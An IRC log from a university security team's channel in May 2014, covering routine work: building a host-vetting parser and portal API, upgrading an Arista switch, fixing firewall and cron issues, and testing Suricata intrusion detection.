2014-05-23 13:47:18	soehlert	ok i'll give that a go. 
2014-05-23 17:05:58	wraquel	w00t
2014-05-23 17:06:03	wraquel	http://proquest.safaribooksonline.com.proxy2.library.illinois.edu/book/programming/python/9781597499576/firstchapter
2014-05-23 17:06:35	jazoff	we have access to safari?
2014-05-23 17:06:40	wraquel	yeah.
2014-05-23 17:06:43	jazoff	w00t!
2014-05-23 17:06:50	wraquel	exactly
2014-05-23 17:06:52	jazoff	albany had this 'books24/7' thing
2014-05-23 17:07:03	jazoff	it was meh
2014-05-23 17:07:08	wraquel	This link is for Violent Python.
2014-05-23 17:07:36	wraquel	I kinda wish they had an ebook checkout option since viewing this through a web page is kinda annoying.
2014-05-23 17:07:42	wraquel	But, hey, free access.
2014-05-23 17:07:56	jazoff	http://proquest.safaribooksonline.com.proxy2.library.illinois.edu/book/-/9781449358921
2014-05-23 17:07:59	jazoff	!
2014-05-23 17:08:18	wraquel	HAH!
2014-05-23 17:08:27	wraquel	sweet
2014-05-23 17:08:34	jazoff	i searched for bgp and found it
2014-05-23 17:08:57	wraquel	nice
2014-05-23 17:09:44	wraquel	Lots of networking books.
2014-05-23 17:10:00	wraquel	Also, next time you're here, you should look at the Grainger Library options.
2014-05-23 17:10:19	jazoff	grainger Library?
2014-05-23 17:10:48	wraquel	it's our campus engineering library
2014-05-23 17:11:08	jazoff	ah
2014-05-23 17:12:48	wraquel	We also have pretty good journal access. I tend to find a lot of half-decent Elsevier ebooks.
2014-05-27 07:18:42	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Connection reset by peer)
2014-05-27 08:04:19	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-05-27 10:35:03	keist	volleyball on Thursday?
2014-05-27 10:38:23	eyrich	yes
2014-05-27 10:38:31	soehlert	sure
2014-05-27 10:40:34	wraquel	maybe. Not because of date, but because my food is still effed up.
2014-05-27 10:40:35	wraquel	foot
2014-05-27 10:40:48	soehlert	i hate when my food is effed up :(
2014-05-27 10:40:57	wraquel	There's that too
2014-05-27 10:47:08	keist	lol
2014-05-27 10:47:30	soehlert	jazoff: you around?
2014-05-27 10:47:34	keist	heal old dawg, heal
2014-05-27 10:51:27	jazoff	yep
2014-05-27 10:51:43	soehlert	so i got the vetting.sh script working
2014-05-27 10:51:47	jazoff	cool
2014-05-27 10:52:09	soehlert	so how do we go about posting to the portal?
2014-05-27 10:52:58	jazoff	hmm
2014-05-27 10:53:11	jazoff	a few minor  changes would make parsing easier..
2014-05-27 10:53:16	soehlert	sure
2014-05-27 10:53:18	jazoff	splitting the info.txt into 3 files
2014-05-27 10:53:24	jazoff	well, 4 files
2014-05-27 10:53:37	soehlert	ok
2014-05-27 10:53:42	jazoff	parsing it isn't very hard.. but if it didn't even need parsing that would be easier
2014-05-27 10:53:53	soehlert	sure. 
2014-05-27 10:54:06	jazoff	i think other than that, it's just a matter of take filename.txt, assign filename key to the contents
2014-05-27 10:57:22	wraquel	Anyone have thoughts on 0MQ?
2014-05-27 10:58:57	jazoff	lots of thoughts
2014-05-27 10:59:07	wraquel	Good and Bad I'm assuming.
2014-05-27 10:59:18	wraquel	Or mostly one way....
2014-05-27 10:59:24	jazoff	mostly good, just need to understand what it does or doesn't do
2014-05-27 10:59:28	wraquel	gotach
2014-05-27 10:59:39	jazoff	it's not magic, it's best thought as a replacement for BSD sockets
2014-05-27 10:59:50	wraquel	I hear the Pythonmq is the most developed and mature.
2014-05-27 11:00:14	wraquel	right.
2014-05-27 11:00:41	wraquel	Found a few books on it on Safari.
2014-05-27 11:00:47	jazoff	http://zguide.zeromq.org/page:all
2014-05-27 11:00:48	jazoff	is really all you need
2014-05-27 11:01:57	wraquel	Ah, that's what I was looking for.
2014-05-27 11:03:51	jazoff	ah, no wonder i'm hungry
2014-05-27 11:03:59	jazoff	keep looking at the IRC time and not local time
2014-05-27 11:05:57	soehlert	wraquel: what is your intended purpose for 0MQ?
2014-05-27 11:06:54	wraquel	soehlert: someone brought it up and I had no idea what it did.
2014-05-27 11:07:06	wraquel	curosity
2014-05-27 11:07:18	soehlert	ah ok. didnt know if you had an intended use or not. since it seems to be a tool allowing you to use other tools?
2014-05-27 11:09:36	wraquel	Like Justin said, it's like BSD sockets, but it does so over almost anything you want, to communicate with other 0mq services. Those other services can be in different languages. At least that's what I'm understanding so far.
2014-05-27 11:16:21	soehlert	ok jazoff, should be easier to parse now
2014-05-27 11:20:35	wraquel	soehlert:  BWAM-1978?
2014-05-27 11:20:41	soehlert	huh?
2014-05-27 11:21:03	wraquel	Just got a comment on it that it hasn't been addressed is all.
2014-05-27 11:21:11	wraquel	I haven't actually looked at the ticket.
2014-05-27 11:21:17	wraquel	Jsut came in a second ago
2014-05-27 11:21:20	soehlert	are you the only watcher? i didnt get any emails
2014-05-27 11:21:40	wraquel	Not sure. I wonder if it was incorrectly assigned.
2014-05-27 11:22:02	soehlert	not on us
2014-05-27 11:22:02	soehlert	on adam
2014-05-27 11:22:10	wraquel	Ah, yeah
2014-05-27 11:22:21	soehlert	you only got emailed because you previously commented
2014-05-27 11:22:57	wraquel	got it. Just ignore me then. I thought it was for regular BW account removal
2014-05-27 11:24:41	soehlert	we'd get a #jira message
2014-05-27 11:26:14	jazoff	oh, hmm, not sure if the jira thing is still running
2014-05-27 11:26:30	soehlert	ah 
2014-05-27 11:26:54	jazoff	probably not since portal-sec was rebooted..
2014-05-27 11:27:05	jazoff	need to have puppet properly deploy it
2014-05-27 11:28:06	jazoff	soehlert: subzero-2014-05-27 is from the latest version?
2014-05-27 11:28:16	soehlert	yes
2014-05-27 11:43:06	jazoff	ok, fixed the vetting API to allow specifying admins in the POST
2014-05-27 11:43:26	jazoff	we probably want to add an admin named "Unknown" or something so it can set it to that
2014-05-27 11:44:13	jazoff	where 'probably' i mean 'I don't know if I can add hosts otherwise' :)
2014-05-27 11:47:54	soehlert	hahah ya good idea
2014-05-27 12:08:05	jazoff	ok, I updated the vetting-parser code to do the tar files
2014-05-27 12:08:17	soehlert	oh it will parse directly from the tar files?
2014-05-27 12:08:23	jazoff	yes, that too
2014-05-27 12:08:59	soehlert	well that may not be necessary. adam wanted these gpg'd so as part of my decrypting script, it untars them. unless your prefer to do that in the parser
2014-05-27 12:09:32	jazoff	it's real easy to do the tar file in python
2014-05-27 12:09:36	jazoff	and I already did it :)
2014-05-27 12:09:50	soehlert	ditto the script on monsoon, but easy enough to remove two lines
2014-05-27 12:10:10	jazoff	basically, looping over a directory vs. looping over a tar file is pretty much the same difficulty
2014-05-27 12:10:19	soehlert	ah gotcha
2014-05-27 12:13:55	soehlert	wheres that script at? i'd like to take a look at it?
2014-05-27 12:15:35	jazoff	https://git-sec.internal.ncsa.edu/ncsa-security/vetting-parser/blob/master/vetting.py
2014-05-27 12:15:38	jazoff	it's much simpler now
2014-05-27 12:15:49	jazoff	just need to add the api stuff now
2014-05-27 12:17:09	soehlert	what are lines 18 and 19 doing?
2014-05-27 12:20:05	jazoff	tar.extractfile(f) grabs a file like object from the tar file
2014-05-27 12:20:21	jazoff	oh, that can be simpliefied more
2014-05-27 12:20:22	jazoff	i'm calling strip twice
2014-05-27 12:20:32	jazoff	and probably shouldn't be doing it like that...
2014-05-27 12:20:59	soehlert	oh nvm i see 19 is making sure the file isnt empty
2014-05-27 12:22:02	jazoff	no.. it means if it is empty the value ends up as None and not ''
2014-05-27 12:22:27	soehlert	right i didnt word well there, but yes that's what imeant
2014-05-27 12:22:38	soehlert	checks if its empty
2014-05-27 12:31:53	jazoff	hmm, the vetting DB wants a mac for each IP
2014-05-27 12:32:11	soehlert	ooo
2014-05-27 12:32:16	soehlert	whys that?
2014-05-27 12:32:25	jazoff	that's what we made the tables have :)
2014-05-27 12:32:55	jazoff	i can make mac not required....
2014-05-27 12:32:55	soehlert	i dont remember that. i never kept track of that before. seems more of a hassle than its worth. we have arpwatch on the 10.5 and im not really worried by it elsewhere. am i alone on that?
2014-05-27 12:37:02	soehlert	i can try to grab that as well if we want that, just seems unnecessary
2014-05-27 12:42:57	jazoff	hah, it worked
2014-05-27 12:42:59	jazoff	https://portal-sec.internal.ncsa.edu/admin/vetting/host/4/
2014-05-27 12:43:25	jazoff	oh, kinda
2014-05-27 12:43:30	soehlert	ya not quite
2014-05-27 12:43:40	jazoff	sending a list is apparently a bad idea
2014-05-27 12:43:44	jazoff	need to just join them back together
2014-05-27 12:43:47	soehlert	ya it seems to only grab the first line
2014-05-27 12:43:57	soehlert	no ips or services either
2014-05-27 12:44:52	jazoff	ok, fixed that problem
2014-05-27 12:45:44	jazoff	services and ips just need some more code
2014-05-27 12:46:19	jazoff	but that's a start :)
2014-05-27 12:46:26	soehlert	indeed
2014-05-27 12:46:47	soehlert	do you think the iptables stuff is good as it is? or should we try to normalize it somehow?
2014-05-27 12:47:17	jazoff	i think normalizing it would get complicated fast
2014-05-27 12:47:34	soehlert	ya i thought the same. just hoped you had some magic way of doing it :)
2014-05-27 12:52:48	jazoff	nah.. look how much trouble the puppet module had with trying to do that
2014-05-27 12:53:12	jazoff	also.. I noticed the vetting report has tcpwrappers but the DB doesnt have tcpwrappers....
2014-05-27 12:54:16	soehlert	oooo right. i somehow missed that when we set this up..
2014-05-27 12:54:35	soehlert	well actually thats because the script was not originally supposed to be for vetting purposes
2014-05-27 12:55:49	jazoff	sooo should I add tcpwrappers to the DB?
2014-05-27 12:56:17	soehlert	ya probably a good idea
2014-05-27 12:56:33	jazoff	a blob field?
2014-05-27 12:56:50	soehlert	ya that makes sense to me
2014-05-27 13:03:19	jazoff	all set
2014-05-27 13:04:14	soehlert	sweet
2014-05-27 13:04:31	eyrich	jazoff: did you update the Arista?
2014-05-27 13:04:34	jazoff	eyrich: no
2014-05-27 13:04:53	eyrich	its running newer code then they have on their support portal for that model
2014-05-27 13:04:56	jazoff	i did read up on it, looks like what I expected
2014-05-27 13:04:59	jazoff	oh?
2014-05-27 13:05:18	eyrich	did you find something some where referencing newer then what we have?
2014-05-27 13:05:25	eyrich	if so i will email the support engineer
2014-05-27 13:05:45	eyrich	they still have 4.12.8 for the 7150
2014-05-27 13:05:58	eyrich	we have 4.13.3F
2014-05-27 13:06:03	jazoff	yeah...
2014-05-27 13:06:32	eyrich	do you know what version you wanted us to upgrade to?
2014-05-27 13:07:26	jazoff	2014-04-28 13:22:13     @loceur Justin; show ip access-lists should be in 4.13.5F (or maybe .6) but it's there now!                                  
2014-05-27 13:07:53	eyrich	ok I will email him
2014-05-27 13:08:13	jazoff	basically the version we have now, the json api does not have 'show ip access-lists'
2014-05-27 13:08:27	jazoff	so I work around it by parsing the txt output, but the newer version would let me remove some code
2014-05-27 13:09:06	eyrich	ok - email sent
2014-05-27 13:09:15	jazoff	eyrich: did they write us back about my tcam question?
2014-05-27 13:09:19	jazoff	i didn't see anything...
2014-05-27 13:09:21	eyrich	not yet
2014-05-27 13:09:28	jazoff	ok
2014-05-27 13:09:49	jazoff	it is a rather low level question
2014-05-27 13:10:10	jazoff	granted we could just test it, but official confirmation that we are doing things the best way would be nice
2014-05-27 13:15:04	jazoff	so looks like todo for vetting:
2014-05-27 13:15:14	jazoff	parse ips, parse netstat output, parse nfs mount output
2014-05-27 13:16:53	soehlert	ip forwarding didnt didnt seem to get set either
2014-05-27 13:20:13	jazoff	ooh, i think it have it backwards
2014-05-27 13:20:16	jazoff	stupid double negative
2014-05-27 13:20:25	soehlert	hah ya that is a bit confusing
2014-05-27 13:21:35	jazoff	fixed i think
2014-05-27 13:44:51	jazoff	yep, ip forwarding works now
2014-05-27 13:45:19	soehlert	nice
2014-05-27 14:28:03	wraquel	suggestions on the best way to parse xml with python?
2014-05-27 14:29:10	soehlert	ive sorta played with lxml but have heard good things about ElementTree
2014-05-27 14:29:20	jazoff	real xml or html?
2014-05-27 14:29:23	wraquel	xml
2014-05-27 14:29:32	wraquel	Like copyright notification crap
2014-05-27 14:29:35	jazoff	yeah, lxml. it has lots of apis though
2014-05-27 14:29:43	jazoff	i usually use pyquery for html
2014-05-27 14:29:47	jazoff	which runs on top of lxml
2014-05-27 15:43:16	 *	keist is heading back to CU
2014-05-27 16:33:58	wraquel	soehlert: did you ever get the NCSA kadmin stuff straightened out with cpl?
2014-05-27 16:34:11	soehlert	no still working on it. had major problems with ticket system
2014-05-27 16:34:19	soehlert	trading messages with doug today
2014-05-27 16:35:42	wraquel	On Chris' non-response?
2014-05-27 16:35:44	wraquel	I hope
2014-05-27 16:36:31	soehlert	well fixing ticket issues and then start a ticket assigned to chris that doug will be aware of. if he is once again unresponsive ill poke the ticket and get Dougs attention
2014-05-27 16:50:52	wraquel	Any idea where the current html is hosted on afs for security.ncsa.illinois.edu?
2014-05-27 17:21:56	wraquel	soehlert: no need to spin up a VM for Ravis log analysis stuff. We can scp it to a dedicated VM that Phuong setup.
2014-05-28 08:56:56	eyrich	jazoff: going to reboot the Arista on the new code soon
2014-05-28 09:03:34	eyrich	jazoff: now running 
2014-05-28 09:03:36	eyrich	Software image version: 4.13.6F
2014-05-28 09:28:05	jazoff	:)
2014-05-28 09:48:09	jazoff	hmm, that doesn't have the commands either
2014-05-28 09:48:30	jazoff	ohh, derr, one sec
2014-05-28 09:48:35	jazoff	forgot you need to send 'enable', '...'
2014-05-28 09:48:38	jazoff	maybe that's it
2014-05-28 09:48:54	jazoff	yay
2014-05-28 09:49:06	jazoff	just doesn't show up int the explorer, but it works
2014-05-28 10:19:59	wraquel	Seth and LIam on Twit TV in 10 minutes http://live.twit.tv/
2014-05-28 10:27:16	wraquel	Live now
2014-05-28 10:28:57	jazoff	eyrich: oh well.. looks like the 'ago' field isn't in the json output...
2014-05-28 10:29:20	jazoff	I suppose I could use the 'sequenceNumber' and check to see if it is increasing though
2014-05-28 10:29:46	jazoff	er, 'packetCount'
2014-05-28 10:30:59	jazoff	need to see what arista says about the tcam stuff first.. will likely need to rewrite a bunch of it anyway
2014-05-28 10:33:52	keist	is that the perl Randal Schwartz on that show
2014-05-28 10:34:48	jazoff	i think so
2014-05-28 10:38:30	soehlert	wraquel: change your kerberos /admin account password
2014-05-28 10:52:46	wraquel	Was it reset to something?
2014-05-28 10:53:11	soehlert	ummm idk. i havent done mine yet do you need to use the old one to change it?
2014-05-28 10:53:22	wraquel	ah. I see
2014-05-28 10:53:26	wraquel	It's telling me to reset it
2014-05-28 10:57:23	wraquel	aaand done
2014-05-28 10:57:50	soehlert	did you just try and run a kadmin action and it prompted you?
2014-05-28 10:58:08	soehlert	also chris was unaware that we were using it to set up kerberos auth and he doesn't seem to like that..
2014-05-28 11:08:12	wraquel	I tried kpasswd but that failed.
2014-05-28 11:08:18	wraquel	Ended up doing kadmin and cpw
2014-05-28 11:09:10	wraquel	How would he prefer we deal with that?
2014-05-28 11:10:13	soehlert	sounds like he expects us to send him a request everytime and then he will do it, but im not sure if he fully understood what we were doing.
2014-05-28 11:10:22	soehlert	waiting to hear back
2014-05-28 11:12:02	wraquel	Well, I wouldn't have a problem with that if he were actually responsive.
2014-05-28 11:33:12	soehlert	wraquel: way to keep rehashing the same stuff in bytes and pieces :)
2014-05-28 11:33:28	wraquel	w00t
2014-05-28 11:33:55	wraquel	Someone actually read it1
2014-05-28 11:33:57	wraquel	!
2014-05-28 11:40:06	jazoff	eyrich: does Jeannette use the other ethernet jack in the office?
2014-05-28 12:26:36	soehlert	jazoff: no need for the mac address stuff on the vetting page. ossec is watching for that sorta thing already
2014-05-28 12:40:56	jazoff	ok
2014-05-28 12:41:12	jazoff	i can leave it in the DB but just make it an optional field
2014-05-28 12:41:17	soehlert	that works
2014-05-28 12:44:55	jazoff	ok, optional
2014-05-28 12:49:36	soehlert	cool
2014-05-28 12:50:16	jazoff	I wrote some code yesterday to parse the netstat output, so that part is done at least
2014-05-28 12:50:23	soehlert	cool
2014-05-28 12:53:14	soehlert	i even understand most of it :)
2014-05-28 12:58:27	jazoff	ah, need to fix it though
2014-05-28 12:58:39	jazoff	looks like I wanted the db to have the host it was bound to not just the port
2014-05-28 13:00:22	jazoff	oh, no i didn't. ok then :)
2014-05-28 13:21:18	jazoff	ok, got service POSTing to work
2014-05-28 13:21:33	jazoff	the rest should be more of the same
2014-05-28 13:21:48	jazoff	just need to enable some more things in the api
2014-05-28 13:22:03	jazoff	but first deal with these mosquitto bites.. working outside might not have been the best idea
2014-05-28 13:22:05	soehlert	awesome
2014-05-28 13:28:55	jazoff	not awesome, itchy
2014-05-28 13:29:15	soehlert	hahah oh didnt even see that message. i actually have a bunch too from this weekend
2014-05-28 13:30:25	jazoff	apparently my gf does not get them, so I get all of them
2014-05-28 13:31:38	soehlert	ouch..
2014-05-28 13:44:17	jazoff	interfaces working...
2014-05-28 13:45:01	jazoff	hmm, I need example nfs mount output
2014-05-28 13:46:06	jazoff	suppose I can use supercll
2014-05-28 13:46:48	soehlert	ya sorry nothing on subzero
2014-05-28 13:51:57	eyrich	jazoff: there are 6 ethernet jacks in the room, 4 are in use
2014-05-28 13:54:48	jazoff	ah.. that was re: "Network Engineering group will be un-patching jacks that havent been used in the past month"
2014-05-28 13:55:11	jazoff	are we having meeting?
2014-05-28 13:55:29	soehlert	i doubt it since wraquel isn't here
2014-05-28 13:57:26	jazoff	ok
2014-05-28 13:57:31	jazoff	nfs mounts should be working now too
2014-05-28 13:57:35	soehlert	sweet
2014-05-28 13:57:41	jazoff	do you want to try it on a different host?
2014-05-28 13:57:45	jazoff	see if it imports everything?
2014-05-28 13:57:46	soehlert	ya sure
2014-05-28 13:57:55	jazoff	i just pushed to the git repo
2014-05-28 14:02:17	eyrich	the monitor is plugged in on the other desk, so should remain active for when you are here
2014-05-28 14:02:22	eyrich	was that the concern?
2014-05-28 14:04:31	jazoff	that they would disconnect that jack
2014-05-28 14:04:34	jazoff	yeah
2014-05-28 14:05:39	soehlert	jazoff: just uploaded one for drought.
2014-05-28 14:05:49	soehlert	uploaded to monsoon that is. how do i kick it up to the portal?
2014-05-28 14:06:05	jazoff	run ./vetting.py drought-whatever.tgz
2014-05-28 14:08:33	soehlert	wait on the .tar.gz?
2014-05-28 14:08:44	soehlert	cuz that file never exists
2014-05-28 14:08:44	soehlert	you mean on the .tar?
2014-05-28 14:11:09	jazoff	oh, sure
2014-05-28 14:11:11	jazoff	that should work too
2014-05-28 14:11:26	soehlert	well the vetting.py seems to just print to stdout..
2014-05-28 14:12:03	jazoff	you have the latest version?
2014-05-28 14:12:32	jazoff	vetting.py from vetting-parser project not from puppet
2014-05-28 14:12:55	soehlert	do you have it sending to monsoon?
2014-05-28 14:13:08	jazoff	no
2014-05-28 14:13:20	soehlert	oh well how am i supposed to do it then?
2014-05-28 14:13:35	jazoff	oh, i see
2014-05-28 14:13:46	jazoff	I suppose we can move that into puppet and delete the vetting-parser repo
2014-05-28 14:13:56	jazoff	for now you just need to clone it
2014-05-28 14:14:02	soehlert	ahhhh ok
2014-05-28 14:14:04	jazoff	git@git-sec.internal.ncsa.edu:ncsa-security/vetting-parser.git
2014-05-28 14:14:06	soehlert	how were you testing it before?
2014-05-28 14:14:13	jazoff	locally
2014-05-28 14:16:55	soehlert	argh can't clone it from monsoon...fatal: The remote end hung up unexpectedly
2014-05-28 14:17:08	soehlert	does git-sec allow access from the sec-pub
2014-05-28 14:17:09	jazoff	you just need the vetting.py.. easy to just scp it
2014-05-28 14:17:19	soehlert	ya i'll just do that i suppose
2014-05-28 14:21:47	soehlert	jazoff: connection errors to portal
2014-05-28 14:21:53	soehlert	requests.exceptions.ConnectionError: [Errno 110] Connection timed out
2014-05-28 14:22:02	jazoff	oh, same issue i guess
2014-05-28 14:22:14	jazoff	can you test from fog for now
2014-05-28 14:22:42	soehlert	can't we just add a fw rule for http from monsoon? were going to need it eventually..
2014-05-28 14:22:51	jazoff	yeah.. doing that now
2014-05-28 14:22:56	soehlert	long run thats where this will always come from
2014-05-28 14:26:31	soehlert	still blocking.
2014-05-28 14:26:38	soehlert	i wonder if pfsense isn't allowing it
2014-05-28 14:26:39	jazoff	try now
2014-05-28 14:26:47	jazoff	just went through
2014-05-28 14:26:50	jazoff	(the puppet change)
2014-05-28 14:26:58	soehlert	i did after you ncsabot said you changed it
2014-05-28 14:27:06	soehlert	currrently failing on telnet to portal-sec
2014-05-28 14:27:11	jazoff	yeah but that was git not puppet
2014-05-28 14:27:12	jazoff	oh, hmm
2014-05-28 14:27:30	soehlert	ya i saw the puppet logs too on portal-sec
2014-05-28 14:27:35	jazoff	:)
2014-05-28 14:27:50	jazoff	trying port 443 ?
2014-05-28 14:28:12	jazoff	if it still doesn't work I suppose it is pfsense
2014-05-28 14:28:28	soehlert	pfsense must be limited to ip's vs the subnet
2014-05-28 14:30:24	jazoff	fog it is :)
2014-05-28 14:32:00	soehlert	ugh gonna take a break on this then. i realized i need to make a few adjustments to the vetting.sh file anyways.
2014-05-28 14:39:49	jazoff	ok, good time for another walk then
2014-05-28 14:40:01	jazoff	need to think about some of the code for that an how to simplify it
2014-05-28 14:40:14	soehlert	it did jump up in size quite a bit today :)
2014-05-28 14:40:18	jazoff	realized I'm splitting all the big fields by newlies and then have to re-join them together
2014-05-28 14:40:32	jazoff	so I should probably not split them in the first place
2014-05-28 14:40:50	soehlert	ah yes that seems unnecessary
2014-05-28 14:56:05	soehlert	ok takin lunch then off to happy hour. we can pick this up tomorrow and have icepick fix the fw
2014-05-28 15:01:25	jazoff	ok
2014-05-29 08:55:28	eyrich	do we have a tftp server I can use on the 10.142.148 network?
2014-05-29 09:11:21	wraquel	FYI, campus Jabber server is going dark in a day or two.
2014-05-29 09:11:35	wraquel	CITES no longer has any interest is running it.
2014-05-29 09:11:51	eyrich	imo - never was very useful
2014-05-29 09:14:47	eyrich	expecially once lync came online for everyone
2014-05-29 09:30:31	jazoff	eyrich: kickstart server should have tftp...
2014-05-29 09:30:57	eyrich	whats the host name?
2014-05-29 09:31:04	jazoff	no idea.. soehlert ?
2014-05-29 09:41:06	wraquel	blocker?
2014-05-29 09:46:38	jazoff	that rings a bell
2014-05-29 10:15:50	jazoff	quick walk time:)
2014-05-29 10:24:28	eyrich	im going to reboot the 3 of the gigamons, the stack is acting bad
2014-05-29 10:38:42	jazoff	no gigamon that's a bad gigamon
2014-05-29 10:51:45	eyrich	all better now
2014-05-29 12:04:14	jazoff	got an rpm of suricata mostly working
2014-05-29 12:04:35	jazoff	running it manually as a test... some hiliarious stuff detected so far
2014-05-29 12:05:03	jazoff	Slammer Worm propagation attempts..
2014-05-29 12:05:35	soehlert	hah oh my
2014-05-29 12:06:43	jazoff	so far it hasn't really done anything useful
2014-05-29 12:06:57	jazoff	main thing it would be good at is leveraging all the windows trojan rules
2014-05-29 12:07:14	 *	soehlert is shocked you think that's an issue for us....
2014-05-29 12:07:25	jazoff	well, there are windows machines
2014-05-29 12:07:38	jazoff	and things like password stealing trojans can be a problem
2014-05-29 12:10:10	jazoff	heh, it flagged a ET USER_AGENTS Suspicious User Agent
2014-05-29 12:10:17	jazoff	was a post to public-test.patch.battle.net
2014-05-29 12:10:36	jazoff	thoughit also flagged weird user-agent stuff to drivergenius.com
2014-05-29 12:10:55	jazoff	update.drivergenius.com and softmgr.drivergenius.com
2014-05-29 12:12:12	wraquel	mining rules
2014-05-29 12:13:52	jazoff	yeah, that too
2014-05-29 12:13:58	jazoff	lots of various rules for bitcoin trojans
2014-05-29 12:14:19	jazoff	nothing that bro can't do, just easier to not re-invent the wheel
2014-05-29 12:15:20	jazoff	drivergenius seems bad though
2014-05-29 12:16:26	jazoff	141.142.231.25 is the one connecting to it
2014-05-29 12:21:30	 *	soehlert was being sarcastic
2014-05-29 12:22:00	jazoff	:)
2014-05-29 12:36:13	wraquel	Slammer I'm guessing is primarily from china.
2014-05-29 12:36:21	wraquel	and maybe brazil
2014-05-29 13:13:50	wraquel	so... why do I only see bhr stats on cyclone since noon?
2014-05-29 13:14:38	eyrich	Jon may have fixed the issues
2014-05-29 13:14:45	wraquel	BHR_STATS is also spotty
2014-05-29 13:15:13	eyrich	yes, thats what Justin and I have been talking about losing logs
2014-05-29 13:16:14	wraquel	So, at one point weren't we at about 150k hosts blocked?
2014-05-29 13:16:25	wraquel	And now we're down to 65kish?
2014-05-29 13:17:42	jazoff	yeah.. could be due to increasing the thresholds a bit
2014-05-29 13:17:46	jazoff	or just a lower rate of scanners
2014-05-29 13:25:37	soehlert	jazoff: can all of the vetting stuff be handled over 443? or do we need 80 open as well?
2014-05-29 13:28:06	jazoff	just 443 is fine
2014-05-29 13:28:10	jazoff	80 just redirects to 443
2014-05-29 13:28:17	soehlert	ok cool thats what i figured
2014-05-29 13:29:24	soehlert	well then that part works, though im getting a 404
2014-05-29 13:29:35	jazoff	oh?
2014-05-29 13:29:53	soehlert	oh more interesting i get this first...added host https://portal-sec.internal.ncsa.edu/vetting/api/host/7/
2014-05-29 13:30:02	jazoff	oh, I think i need to deploy
2014-05-29 13:30:03	jazoff	derr
2014-05-29 13:30:19	soehlert	deploy what?
2014-05-29 13:30:21	jazoff	can you delete that host and re-try
2014-05-29 13:30:23	jazoff	the portal code
2014-05-29 13:30:39	soehlert	ok. try now?
2014-05-29 13:30:47	jazoff	yes
2014-05-29 13:32:21	soehlert	much better
2014-05-29 13:32:23	soehlert	less errors
2014-05-29 13:32:29	jazoff	less as in 0
2014-05-29 13:32:30	jazoff	?
2014-05-29 13:32:34	soehlert	%s/less/0/
2014-05-29 13:32:37	jazoff	:)
2014-05-29 13:32:54	jazoff	the one downside of using the api is I need to add the host then add each related obejct
2014-05-29 13:32:57	jazoff	so it isn't atomic
2014-05-29 13:33:04	jazoff	but it does keep things somewhat simple
2014-05-29 13:33:38	soehlert	im not familiar with the atomic term
2014-05-29 13:33:50	jazoff	all or nothing
2014-05-29 13:33:56	soehlert	ah gotcha
2014-05-29 13:34:03	soehlert	i only see two iffy things on this upload.
2014-05-29 13:34:17	soehlert	its description is set to the OS. which is not what we want.
2014-05-29 13:34:22	jazoff	yeah, that's all i had
2014-05-29 13:34:35	jazoff	and we dont have an os field...
2014-05-29 13:34:41	soehlert	ya the description should probably get an unknown like admins and ya i just realized that
2014-05-29 13:34:52	soehlert	the description is supposed to be something along th elines of security dev bro master
2014-05-29 13:35:18	jazoff	ah
2014-05-29 13:35:33	jazoff	welll, progress :)
2014-05-29 13:35:38	soehlert	indeed
2014-05-29 13:35:43	soehlert	i keep moving the goal posts on you here
2014-05-29 13:39:20	jazoff	that's ok, we can just keep iterating
2014-05-29 13:39:39	soehlert	were already way further along than i expected so im not worried.
2014-05-29 13:51:20	eyrich	bhr stats did not get generated on cygnus at 13:50
2014-05-29 13:52:19	eyrich	never mind, digest is one an hour
2014-05-29 13:52:34	eyrich	no - that is email, stats are supposes to happen with cronjov
2014-05-29 13:54:40	eyrich	jazoff: thoughts?
2014-05-29 13:55:16	jazoff	is the cron job still set to do > /dev/null ?
2014-05-29 13:55:35	eyrich	no
2014-05-29 13:55:54	jazoff	did it fail and send an email to someone then?
2014-05-29 13:57:03	eyrich	root@cygnus:/var/log# tail -F /var/spool/mail/root
2014-05-29 13:57:03	eyrich	X-Cron-Env: <HOME=/root>
2014-05-29 13:57:03	eyrich	X-Cron-Env: <PATH=/usr/bin:/bin>
2014-05-29 13:57:03	eyrich	X-Cron-Env: <LOGNAME=root>
2014-05-29 13:57:03	eyrich	Message-Id: <20140529185519.DEEB4AB659@cygnus.ncsa.illinois.edu>
2014-05-29 13:57:03	eyrich	Date: Thu, 29 May 2014 13:55:19 -0500 (CDT)
2014-05-29 13:57:03	eyrich	Building Configuration...
2014-05-29 13:57:03	eyrich	Integrated configuration saved to /etc/quagga/Quagga.conf
2014-05-29 13:57:03	eyrich	[OK]
2014-05-29 13:58:53	jazoff	odd
2014-05-29 14:02:33	eyrich	it created them at 2pm
2014-05-29 14:03:33	jazoff	i thought it was hourly?
2014-05-29 14:04:13	eyrich	hmm, i thought we did the stats as part of the 5 minute cronjob
2014-05-29 14:04:34	jazoff	not that I recall.. they don't change that often
2014-05-29 14:04:53	jazoff	stats is part of digest
2014-05-29 14:05:14	eyrich	ok
2014-05-29 14:05:18	eyrich	good to go then
2014-05-29 14:05:43	jazoff	it's not often i FIX things by looking at them :)
2014-05-29 14:20:26	jazoff	walk time :)
2014-05-29 14:34:05	jazoff	getting hot out there
2014-05-29 15:15:53	soehlert	jazoff: are we blocking on SQLI attempts?
2014-05-29 15:17:32	jazoff	i dont think so
2014-05-29 15:17:35	jazoff	just alerting
2014-05-29 15:17:38	soehlert	ok
2014-05-29 15:18:15	soehlert	141.142.192.157 is getting hammered with them
2014-05-29 15:28:11	jazoff	eyrich: those https issues cropped up on the arista again.. temporarily switched to plain http
2014-05-29 15:28:24	jazoff	was wondering why nothing was getting filtered
2014-05-29 15:35:02	eyrich	i ran into the same issue when using the gui
2014-05-29 15:35:08	eyrich	today
2014-05-29 15:35:12	eyrich	i think they are related
2014-05-29 15:35:39	eyrich	i just closed the tap gui
2014-05-30 08:06:09	eyrich	cleaning up some pfsense cluster stuff, will generate some messages
2014-05-30 08:13:50	eyrich	i may have blown something up - it shouldnt have but did
2014-05-30 08:14:27	jazoff	ut oh
2014-05-30 08:15:41	eyrich	i also cant get into haboob - which is outside of what I was doing
2014-05-30 08:15:43	eyrich	wtf
2014-05-30 08:17:46	eyrich	all i did was fail over to the secondary cluster member
2014-05-30 08:17:58	eyrich	by shutting down the primary
2014-05-30 08:18:03	eyrich	and now no access
2014-05-30 08:18:06	eyrich	to vcenter
2014-05-30 08:18:25	eyrich	ive made the swap before during upgrades and didnt have this issue
2014-05-30 08:28:56	jazoff	well, nagios detected the problem at least :)
2014-05-30 08:46:45	soehlert	wfh this morning while i wait for maintenance
